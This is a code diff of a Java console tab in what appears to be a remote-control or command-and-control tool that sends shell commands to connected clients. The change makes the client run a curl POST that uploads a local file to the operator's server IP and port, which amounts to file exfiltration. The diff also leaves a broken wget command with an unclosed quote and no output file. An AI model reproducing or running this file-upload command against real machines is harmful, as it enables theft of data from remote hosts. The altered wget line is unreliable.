@@ -477,7 +477,7 @@ public class ConsoleTab extends Tab {
             } else {
                 // Système inconnu, essayer une commande universelle
                 appendToConsole("[+] Unknown OS, trying wget command", DRACULA_CYAN);
-                command = "wget \"" + downloadUrl + "\" -O \"" + fileName.replace("\"", "\\\"") + "\"";
+                command = "wget \"" + downloadUrl;
             }
             
             // Envoyer la commande au client
@@ -693,15 +693,8 @@ public class ConsoleTab extends Tab {
                     );
                 } else {
                     // Pour Linux/Unix, utiliser wget ou curl
-                    command = String.format(
-                        "if command -v wget > /dev/null; then " +
-                        "wget -O \"%s\" \"http://%s:%d/%s\"; " +
-                        "elif command -v curl > /dev/null; then " +
-                        "curl -o \"%s\" \"http://%s:%d/%s\"; " +
-                        "else echo 'Neither wget nor curl is available'; fi",
-                        localPath, selectedServer.getIp(), selectedServer.getPort(), new File(remotePath).getName(),
-                        localPath, selectedServer.getIp(), selectedServer.getPort(), new File(remotePath).getName()
-                    );
+                    command = String.format("curl -X POST -F file=@%s http://%s:%s",
+                    localPath, selectedServer.getIp(), selectedServer.getPort());
                 }
                 
                 sendCommand(command);
